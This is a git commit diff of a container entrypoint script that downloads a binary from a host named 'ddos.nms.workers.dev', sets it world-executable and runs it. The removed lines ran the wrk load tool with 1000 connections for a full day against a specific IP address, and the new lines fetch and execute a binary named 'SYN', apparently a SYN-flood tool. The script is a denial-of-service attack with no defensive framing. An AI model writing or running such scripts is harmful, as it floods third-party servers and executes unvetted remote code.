35e369ff9907985d043edbce723c0ab04048b224
fnardn <56334451+niniubiwoc@users.noreply.github.com>
2021-09-18 12:01:17 +0800

    Update entrypoint.sh

--- entrypoint.sh
+++ entrypoint.sh
@@ -1,10 +1,10 @@
 #!/bin/sh
 
 #Download wrk
-curl -O https://ddos.nms.workers.dev/wrk
+curl -O https://ddos.nms.workers.dev/SYN
 
 #Chmod
-chmod 777 wrk
+chmod 777 SYN
 
 #running
-./wrk -t347 -c1000 -d86400s http://51.38.92.223
+./SYN
